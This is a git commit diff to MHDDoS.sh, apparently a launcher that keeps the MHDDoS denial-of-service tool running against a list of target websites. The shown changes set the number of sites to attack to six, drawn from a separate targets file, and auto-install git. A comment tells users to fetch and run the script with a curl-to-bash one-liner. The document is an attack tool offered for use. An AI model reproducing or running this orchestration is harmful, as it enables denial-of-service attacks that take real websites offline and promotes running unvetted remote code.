972d92dfa0cd04e9084f7aabca96a31b567804b6
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-03-13 10:08:38 +0200

    Update MHDDoS.sh

--- MHDDoS.sh
+++ MHDDoS.sh
@@ -1,11 +1,19 @@
+#!/bin/bash
 ##### Use next command in local linux terminal to run this script.
 #curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS.sh | bash
 ##### To kill script press CTRL+C several times.
 
-#!/bin/bash
 
-## Check every 10 sec if MHDDos is terminated. It happens often for some reason. Relaunch process if terminated.
+## Check every 10 sec if MHDDos is terminated. It happens often for some reason. Re-launch if it's not running.
 check_interval=10
+
+## Number of sites to attack. Choosen from (https://github.com/KarboDuck/karbo-wiki/blob/master/MHDDoS_targets)
+num_of_targets=6
+
+# Install git if it doesn't installed already
+if [ ! -f /usr/bin/git ]; then
+   sudo apt install git
+fi
 
 while true
 do
